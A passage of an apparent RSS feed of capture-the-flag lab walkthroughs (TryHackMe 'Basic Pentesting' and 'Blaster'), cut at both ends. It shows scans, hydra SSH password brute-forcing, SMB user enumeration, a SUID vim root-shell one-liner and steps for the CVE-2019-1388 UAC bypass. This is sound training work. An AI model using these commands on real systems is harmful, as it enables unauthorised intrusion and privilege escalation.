|_http-stored-xss: Couldn&amp;#39;t find any stored XSS vulnerabilities.
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn&amp;#39;t find wp-login.php
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=11/4%OT=22%CT=1%CU=34280%PV=Y%DS=4%DC=T%G=Y%TM=618494C
OS:8%P=aarch64-unknown-linux-gnu)SEQ(SP=102%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS
OS:=8)OPS(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M
OS:506ST11NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68
OS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
OS:=40%CD=S)

Uptime guess: 0.019 days (since Thu Nov  4 19:52:32 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   30.62 ms  10.13.0.1
2   ... 3
4   172.85 ms 10.10.74.250

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov  4 20:19:52 2021 -- 1 IP address (1 host up) scanned in 1390.99 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Available services:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;OpenSSH 7.2p2 on port 22&lt;/li&gt;&lt;li&gt;Apache 2.4.18 on port 80&lt;/li&gt;&lt;li&gt;Samba 3 or 4 on ports 139/445&lt;/li&gt;&lt;li&gt;Apache Jserve on port 8009&lt;/li&gt;&lt;li&gt;Apache Tomcat 9.0.7 on port 8080&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;The server looks to be running Ubuntu.&lt;/p&gt;&lt;p&gt;Going to &lt;a href=&quot;http://10.10.74.250:80&quot;&gt;http://10.10.74.250:80&lt;/a&gt; revels a generic &quot;maintenance&quot; page, but there's a note to &quot;[c]heck our dev note section if you need to know what to work on.&quot;&lt;/p&gt;&lt;p&gt;Going to &lt;a href=&quot;http://10.10.74.250:8080&quot;&gt;http://10.10.74.250:8080&lt;/a&gt; reveals what looks like the generic first-run Tomcat page. Poking around there doesn't reveal any obvious modifications.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22nmap%22.md&quot;&gt;Using &quot;nmap&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;flag-1&quot;&gt;Flag 1&lt;/h2&gt;&lt;p&gt;Let's hit &lt;a href=&quot;http://10.10.74.250:80&quot;&gt;http://10.10.74.250:80&lt;/a&gt; with gobuster and see what we find!&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gobuster&lt;/span&gt; dir &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-u&lt;/span&gt; http://10.10.74.250 &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It looks like there's a &quot;hidden&quot; directory &lt;a href=&quot;http://10.10.74.250/development/&quot;&gt;http://10.10.74.250/development/&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;FLAG 1: &lt;code&gt;development&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&quot;flags-2-3-4-and-5&quot;&gt;Flags 2, 3, 4, and 5&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://10.10.74.250/development/&quot;&gt;http://10.10.74.250/development/&lt;/a&gt; contains two files.&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://10.10.74.250/development/dev.txt&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;2018-04-23: I&amp;#39;ve been messing with that struts stuff, and it&amp;#39;s pretty cool! I think it might be neat
to host that on this server too. Haven&amp;#39;t made any real web apps yet, but I have tried that example
you get to show off how it works (and it&amp;#39;s the REST version of the example!). Oh, and right now I&amp;#39;m 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay, so we've got two users, &quot;J&quot; and &quot;K&quot;, and an example REST app of some kind (using Apache Struts?) with version 2.5.12.&lt;/p&gt;&lt;p&gt;&lt;code&gt;http://10.10.74.250/development/j.txt&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;For J:

I&amp;#39;ve been auditing the contents of /etc/shadow to make sure we don&amp;#39;t have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Seems like J has a weak password.&lt;/p&gt;&lt;p&gt;From a quick check of the hydra man page, it looks like we can feed it a list of usernames with the -L option. I'm going to make a couple assumptions:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Usernames are probably English-language first names. I'm guessing this because the comments in the /development directory are in English, and because this is supposed to be an &quot;easy&quot; CTF.&lt;/li&gt;&lt;li&gt;The password is probably listed in the rockyou.txt dump. Again, both because of the comment, and because this is an &quot;easy&quot; CTF.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;A couple of quick searches on DuckDuckGo landed me on this list of common usernames; I'm going to filter that down to just the Js and then feed it + rockyou.txt into Hydra.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;hydra&lt;/span&gt; -t 4 -L j.txt -P rockyou.txt -vV 10.10.74.250 ssh&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Exceptâ¦ That's going to take &lt;em&gt;forever&lt;/em&gt;. The hint suggests looking at Samba to find usernames, which is a good reminder.&lt;/p&gt;&lt;p&gt;I &lt;em&gt;thought&lt;/em&gt; I had some notes about how to do this, but it looks like I don't. But a little bit of search brings me to &quot;Nmap SMB Scripts and SMB Enumeration Step-By-Step Pentesting Guide&quot;. To nmap again!&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;nmap&lt;/span&gt; -vv -oA basic-pentesting-enumerate-smb -sT &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb7-2&quot;&gt;&lt;a href=&quot;#cb7-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;     &lt;span class=&quot;ex&quot;&gt;--script&lt;/span&gt; smb-enum-users.nse -p445 10.10.74.250&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;But this doesn't return any results (maybe it's Windows-specific?).&lt;/p&gt;&lt;p&gt;A bit more internet searching and I arrive at &quot;Enumerate SMB with Enum4linux &amp;amp; Smbclient&quot;, which suggests using enum4linux.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb8&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb8-1&quot;&gt;&lt;a href=&quot;#cb8-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;enum4linux&lt;/span&gt; -U 10.10.74.250&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;But this errors out on me before outputting any useful information. (It did list a user named &lt;code&gt;krbtgt&lt;/code&gt;, but after getting excited and thinking this might be &quot;K&quot; I realized that this looked like it might be related to Kerberosâ¦ And a brief internet search confirmed this.)&lt;/p&gt;&lt;p&gt;Trying to use the Metasploit module auxiliary/smb/smb_lookupsid as suggested in &quot;A Little Guide to SMB Enumeration&quot; just resulted in an error about the server not being &quot;able to handle the encrypted request.&quot;&lt;/p&gt;&lt;p&gt;Switching back to trying to get enum4linux to work, I tried calling it &lt;em&gt;without&lt;/em&gt; the -U flag. This does a full enumeration, and in particular tries to &quot;brute-force&quot; usernames by guessing SIDs. This worked! (I still got the same error, but the enumeration continuedâ¦) We have two users, &lt;code&gt;kay&lt;/code&gt; and &lt;code&gt;jan&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Let's turn back to Hydra, but now using the username of &lt;code&gt;jan&lt;/code&gt;. I'm also going to try a shorter wordlist, because rockyou.txt is ridiculously long.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb9&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb9-1&quot;&gt;&lt;a href=&quot;#cb9-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;hydra&lt;/span&gt; -t 4 -l jan -P /usr/share/wordlists/nmap.lst &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb9-2&quot;&gt;&lt;a href=&quot;#cb9-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;      &lt;span class=&quot;ex&quot;&gt;-vV&lt;/span&gt; 10.10.74.250 ssh&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And we've got a match â jan's password is &lt;code&gt;armando&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;Andâ¦ We're in!&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb10&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb10-1&quot;&gt;&lt;a href=&quot;#cb10-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;env&lt;/span&gt; -u SSH_AUTH_SOCK -u SSH_AGENT_PID &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb10-2&quot;&gt;&lt;a href=&quot;#cb10-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;fu&quot;&gt;ssh&lt;/span&gt; jan@10.10.74.250&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;FLAG 2: &lt;code&gt;jan&lt;/code&gt;&lt;/p&gt;&lt;p&gt;FLAG 3: &lt;code&gt;armando&lt;/code&gt;&lt;/p&gt;&lt;p&gt;FLAG 4: &lt;code&gt;SSH&lt;/code&gt;&lt;/p&gt;&lt;p&gt;FLAG 5: &lt;code&gt;kay&lt;/code&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Hydra.md&quot;&gt;Using Hydra&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://duckduckgo.com/&quot;&gt;DuckDuckGo&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/jeanphorn/wordlist/blob/master/usernames.txt&quot;&gt;wordlist / usernames.txt&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.infosecademy.com/nmap-smb-scripts-enumeration/&quot;&gt;Nmap SMB Scripts and SMB Enumeration Step-By-Step Pentesting Guide&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/&quot;&gt;Enumerate SMB with Enum4linux &amp;amp; Smbclient&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20Metasploit.md&quot;&gt;Using Metasploit&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/&quot;&gt;A Little Guide to SMB Enumeration&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;flag-6&quot;&gt;Flag 6&lt;/h2&gt;&lt;p&gt;Now that we're in, let's see if we can escalate privileges.&lt;/p&gt;&lt;p&gt;Jan's home directory is a little weirdâ¦ It contains a single file (~/.lesshst), and is owned by root!&lt;/p&gt;&lt;p&gt;Home directories are world-readable, so we can see what's in kay's. It looks more normalâ¦ But also contains a file called pass.bak, which looks like it might be our last flag (&quot;the final password&quot;). Unfortunately, it's not world-readable, and neither are any of kay's history files.&lt;/p&gt;&lt;p&gt;Does jan have sudo privileges? Running &lt;code&gt;sudo -l&lt;/code&gt; suggests not.&lt;/p&gt;&lt;p&gt;Let's see if there are any interesting binaries on the system that jan both has access to and I could potentially abuse.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb11&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb11-1&quot;&gt;&lt;a href=&quot;#cb11-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;find&lt;/span&gt; / -type f &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb11-2&quot;&gt;&lt;a href=&quot;#cb11-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;dt&quot;&gt;\(&lt;/span&gt; -perm -u+s -o -perm -g+s &lt;span class=&quot;dt&quot;&gt;\)&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb11-3&quot;&gt;&lt;a href=&quot;#cb11-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;       &lt;span class=&quot;ex&quot;&gt;-exec&lt;/span&gt; ls -l {} &lt;span class=&quot;dt&quot;&gt;\;&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;2&amp;gt;&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;/dev/null&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Andâ¦ /usr/bin/vim.basic is SUID root?!? GTFOBins suggests that this can lead to a privilege escalation if ViM is compiled with Pythonâ¦ And, indeed, running &lt;code&gt;vim.basic --version&lt;/code&gt; reveals that this is the case.&lt;/p&gt;&lt;p&gt;Adapting the escape from GTFOBins for the present case gives us:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb12&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb12-1&quot;&gt;&lt;a href=&quot;#cb12-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;vim.basic&lt;/span&gt; -c &lt;span class=&quot;st&quot;&gt;&amp;#39;:py3 import os; os.execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-pc&amp;quot;, &amp;quot;reset; exec sh -p&amp;quot;)&amp;#39;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And this indeed gives us root! With this new power, we can enter kay's home directory and read pass.bak for our final flag.&lt;/p&gt;&lt;p&gt;FLAG 6: &lt;code&gt;heresareallystrongpasswordthatfollowsthepasswordpolicy$$&lt;/code&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/vim/&quot;&gt;vim (GTFOBins)&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;ELAPSED TIME: 3 h 19 min&lt;/p&gt;&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/basicpentestingjt&quot;&gt;TryHackMe: Basic Pentesting&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Basic%20Pentesting.md</guid>
		</item>
		<item>
			<title>Blaster</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/Blaster.md</link>
			<description>&lt;h2 id=&quot;mission-start&quot;&gt;Mission Start!&lt;/h2&gt;&lt;p&gt;The CTF background notes that we'll be attacking a Windows box. So no ping responses again.&lt;/p&gt;&lt;h2 id=&quot;activate-forward-scanners-and-launch-proton-torpedoes&quot;&gt;Activate Forward Scanners and Launch Proton Torpedoes&lt;/h2&gt;&lt;p&gt;The machine we'll be attacking is at 10.10.223.185. As usual, we'll start out with an nmap scan:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;sudo&lt;/span&gt; nmap -v -oA blaster -Pn -A -T4 -sS -script vuln &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;          &lt;span class=&quot;ex&quot;&gt;-p-&lt;/span&gt; 10.10.223.185&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Which gives us:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Wed Dec  8 19:55:54 2021 as: nmap -v -oA blaster -Pn -A -T4 -sS -script vuln -p- 10.10.223.185
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.223.185
Host is up (0.23s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-csrf: Couldn&amp;#39;t find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn&amp;#39;t find any DOM based XSS.
|_http-stored-xss: Couldn&amp;#39;t find any stored XSS vulnerabilities.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016 (90%), FreeBSD 6.X (85%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:freebsd:freebsd:6.2
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (90%), Microsoft Windows Server 2016 (89%), FreeBSD 6.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.013 days (since Wed Dec  8 19:54:04 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   34.47 ms  10.13.0.1
2   ... 3
4   351.16 ms 10.10.223.185

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  8 20:12:16 2021 -- 1 IP address (1 host up) scanned in 982.31 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;FLAG 1: How many ports are open on the target? - 2&lt;/p&gt;&lt;p&gt;Looks like IIS running on port 80. Let's go take a peek.&lt;/p&gt;&lt;p&gt;â¦And, it's just the default IIS &quot;hello world&quot; page. Looks a damn sight prettier than Apache's.&lt;/p&gt;&lt;p&gt;FLAG 2: What is the title of the webserver's index page? - IIS Windows Server&lt;/p&gt;&lt;p&gt;Since there's nothing obvious here (and because the CTF is prompting us to do so), let's sic gobuster on this to see if there's anything interesting that's not linked to the (default) index page.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;gobuster&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-t&lt;/span&gt; 10 dir &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    &lt;span class=&quot;ex&quot;&gt;-u&lt;/span&gt; http://10.10.223.185/&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;FLAG 3: What is the hidden directory on the webserver? - /retro&lt;/p&gt;&lt;p&gt;Browsing to this directory reveals an entire &quot;Retro Fanatics&quot; website. All posts are by &quot;Wade&quot;.&lt;/p&gt;&lt;p&gt;FLAG 4: What username is associated with this hidden directory? - Wade&lt;/p&gt;&lt;p&gt;Pocking around a bit more reveals a somewhat cryptic comment on a post:&lt;/p&gt;&lt;blockquote&gt;&lt;p&gt;Leaving myself a note here just in case I forget how to spell it: parzival&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Who wants to bet that this is Wade's password?&lt;/p&gt;&lt;p&gt;FLAG 5: What potential password is associated with this user? - parzival&lt;/p&gt;&lt;p&gt;Let's load up XFreeRDP and see if we can log in, shall we?&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;xfreerdp&lt;/span&gt; /dynamic-resolution +clipboard /cert:ignore &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;         /v:&lt;span class=&quot;ex&quot;&gt;10.10.223.185&lt;/span&gt; /u:Wade /p:parzival&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Boom!&lt;/p&gt;&lt;p&gt;FLAG 6: What are the contents of &lt;code&gt;user.txt&lt;/code&gt;? - &lt;code&gt;THM{HACK_PLAYER_ONE}&lt;/code&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22nmap%22.md&quot;&gt;Using &quot;nmap&quot;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20%22gobuster%22.md&quot;&gt;Using &quot;gobuster&quot;&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/CTF%20Walk-Throughs/../Notes/Using%20XFreeRDP.md&quot;&gt;Using XFreeRDP&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;breaching-the-control-room&quot;&gt;Breaching the Control Room&lt;/h2&gt;&lt;p&gt;There's no obvious files when pocking around except an hhupd.exe file on the desktop, and IE's history is empty.&lt;/p&gt;&lt;p&gt;Since I know we're looking for a CVE name, at this point I just used the Windows File Explorer to search Wade's home directory for &quot;CVE&quot;. And lo-and-behold, there's a cached HTML file in C:/Users/Wade/AppData/Local/Microsoft/Windows/INetCache/Low/IE/7Z6YUWVY called cvename[1].htm which contains a website referencing CVE-2019-1388 (it looks like a slightly older version of the MITRE CVE page on CVE-2019-1388).&lt;/p&gt;&lt;p&gt;FLAG 7: What CVE was the initially compromised user researching? - CVE-2019-1388&lt;/p&gt;&lt;p&gt;(I feel like the approach I just used - making an educated guess about what the CTF was looking for and then just searching for it - is kind of a cop-out. &lt;em&gt;But&lt;/em&gt;, the hint for this question states that I should check IE's history, which I didâ¦ So perhaps the room's broken?)&lt;/p&gt;&lt;p&gt;Anyways, I'm guessing that the hhupd.exe file on the desktop is the one that will exploit this vulnerability, since it's badged as needing administrative privileges and CVE-2019-1388 is a vulnerability in the UAC screen.&lt;/p&gt;&lt;p&gt;FLAG 8: What is the name of the executable the user was experimenting with? - hhupd.exe&lt;/p&gt;&lt;p&gt;In fact, a search for &quot;CVE-2019-1388 exploit&quot; pulls up a page that references hhupd.exe and helpfully links to a YouTube video demoing how this exploit works. It looks like the steps here are:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Try to run hhupd.exe.&lt;/li&gt;&lt;li&gt;Show details on the UAC prompt.&lt;/li&gt;&lt;li&gt;Click on the certificate information link.&lt;/li&gt;&lt;li&gt;Click on the issuer link. This will open up an instance of IE running with elevated permissions in the background.&lt;/li&gt;&lt;li&gt;Exit the UAC dialog.&lt;/li&gt;&lt;li&gt;Bring up the save dialog in IE.&lt;/li&gt;&lt;li&gt;Navigate to &lt;code&gt;C:/Windows/System32/*.*&lt;/code&gt; and open cmd.exe.&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;FLAG 9: What is the output of &lt;code&gt;whoami&lt;/code&gt; in the terminal spawned using the user's exploit? - &lt;code&gt;nt authority\system&lt;/code&gt;&lt;/p&gt;&lt;p&gt;The final flag is in the Administrator's Desktop 